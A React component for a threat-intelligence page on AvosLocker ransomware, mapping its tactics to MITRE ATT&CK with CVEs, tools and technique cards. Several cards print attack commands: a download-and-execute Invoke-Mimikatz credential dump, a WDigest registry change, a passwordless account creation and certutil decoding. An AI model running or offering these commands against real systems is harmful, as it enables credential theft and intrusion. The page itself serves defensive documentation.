import React from 'react'

type Propx = {
  className: string
}

const Avoslocker: React.FC<Propx> = ({className}) => { 
  return (
	<>
    <div className={`card mb-6 ${className}`}>
        <h1 className='card-title fw-bold fs-2qx pt-6'>MITRE ATT&CK MATRIX</h1>
        <div className='card-body pt-3 pb-6'>
        <div className='table-responsive border-start border-end border-gray-100'>
          <table className='table align-baseline gx-1 gy-4 table-striped border border-gray-800'>
            <thead>
			   <tr className='fs-6 fw-semebold text-gray-100 bg-gray-800 text-center'>
			    	<th className='min-w-175px border-end border-gray-100'>Initial-Access</th>
			    	<th className='min-w-175px border-end border-gray-100'>Execution</th>
			    	<th className='min-w-175px border-end border-gray-100'>Persistence</th>
			    	<th className='min-w-175px border-end border-gray-100'>Privilege-Escalation</th>
			    	<th className='min-w-175px border-end border-gray-100'>Defense-Evasion</th>
			    	<th className='min-w-175px border-end border-gray-100'>Credential-Access</th>
			    	<th className='min-w-175px border-end border-gray-100'>Discovery</th>
			    	<th className='min-w-175px border-end border-gray-100'>Lateral-Movement</th>
			    	<th className='min-w-175px border-end border-gray-100'>Command-and-Control</th>
			    	<th className='min-w-175px border-end border-gray-100'>Impact</th>
               </tr>
            </thead>
            <tbody>
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1190</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Exploit public-facing application</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>- CVE-2021-31206
- CVE-2021-31207
- CVE-2021-34473
- CVE-2021-34523
- CVE-2021-26855
</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1072</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Software deployment tools</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Used PDQ Deploy to distribute the batch file and payload on target computers.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1136</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Create account</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Creates a new user to ensure automatic login when machine is restarted in safe mode.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1112</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Modify registry</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Modifies registry entry to allow AnyDesk on safe mode and to enable automatic login when restarted in safe mode.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1562</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Impair defenses</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Avast Anti-Rootkit Scanner</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1003</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>OS credential dumping</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Might utilize Mimikatz to dump credentials.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1083</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>File and directory discovery</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Find or discover files on the file system.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1021</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Remote services</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Might use AnyDesk to remotely connect and transfer files.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1219</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Remote access software</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>AnyDesk</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1486</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Data encrypted for impact</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>- salsa12
- AES-256-CBC
- RSA
- .avos
- .avos2
</div>
								</div>
							</div>
						</div>
					</td>          
				</tr>
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1547</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Boot or logon autostart execution</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Creates an autostart entry to ensure execution of ransomware when restarted in safe mode</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1140</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Deobfuscate/Decode files or information</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Rename certutil and decode a file.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1552</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Unsecured credentials</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>XenArmor Password Recovery Tool Pro</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1135</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Network share discovery</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Makes use of tools to enumerate network share.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1072</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Software deployment tools</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>PDQ Deploy</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1489</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Service stop</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Contains a list of services to be terminated to ensure encryption.</div>
								</div>
							</div>
						</div>
					</td>          
				</tr>
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1070</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Indicator removal on host</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>It deletes created registry entries, scripts, and ransomware binary after encryption.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1555</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Credentials from password stores</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>XenArmor Password Recovery Tool Pro</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1057</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Process discovery</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Discovers certain processes for process termination.</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1490</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Inhibit system recovery</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Deletes VSS.</div>
								</div>
							</div>
						</div>
					</td>          
				</tr>
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1018</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Remote system discovery</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>NetScan, Nmap</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'></span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-gray-800'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1491</span>
								<span className='text-gray-800 fw-semibold mb-1 fs-7'>Defacement</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Replaces the desktop wallpaper with the ransom note.</div>
								</div>
							</div>
						</div>
					</td>          
				</tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Initial-Access</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1190</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Exploit public-facing application</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Arrives by exploiting Zoho ManageEngine ServiceDesk Plus Exploit to download web shell and AnyDesk.</div>
					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
					<div className='fs-4 fw-semebold pb-5 ms-5 text-gray-800 fst-italic'>
						<div>&deg;&nbsp;CVE-2021-31206</div>
					
						<div>&deg;&nbsp;CVE-2021-31207</div>
					
						<div>&deg;&nbsp;CVE-2021-34473</div>
					
						<div>&deg;&nbsp;CVE-2021-34523</div>
					
						<div>&deg;&nbsp;CVE-2021-26855</div>
					</div>
					
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Execution</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1072</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Software deployment tools</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Used PDQ Deploy to distribute the batch file and payload on target computers.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;%PROGRAMFILES(x86)%/#PDQ_Deploy_exe</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Persistence</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1136</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Create account</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Creates a new user to ensure automatic login when machine is restarted in safe mode.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;New-LocalUser -Name "#username" -NoPassword</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1547</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Boot or logon autostart execution</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Creates an autostart entry to ensure execution of ransomware when restarted in safe mode.</div>
					
					
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Privilege-Escalation</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1112</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Modify registry</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Modifies registry entry to allow AnyDesk on safe mode and to enable automatic login when restarted in safe mode.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Defense-Evasion</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1562</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Impair defenses</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Abuses Avast Anti-Rootkit Driver and a PowerShell script to disable certain processes related to security tools and also restarts the machine in safe mode to inhibit security tools from executing.</div>
					
					
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1140</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Deobfuscate/Decode files or information</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Some ransomware samples are decoded using CertUtil and strings to be used by the ransomware are encrypted using XOR.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;copy %windir%\system32\certutil.exe %temp%\tcm.tmp</div>
							<div>&deg;&nbsp;%temp%\tcm.tmp -encode #executable %temp%\T1140_calc2.txt</div>
							<div>&deg;&nbsp;%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1070</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Indicator removal on host</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>It deletes created registry entries, scripts, and ransomware binary after encryption.</div>
					
					
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-gray-800 pt-1 ps-3'>Credential-Access</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1003</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- OS credential dumping</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-800 fst-italic'>
							<div>&deg;&nbsp;IEX (New-Object Net.WebClient).DownloadString('#remote_script'); Invoke-Mimikatz -DumpCreds</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1552</span>
						<span className='text-gray-800 fw-bold mb-1 fs-3'>- Unsecured credentials</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Might utilize Mimikatz or XenArmor Password Recovery Pro tool to gather credentials.</div>
					
					
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
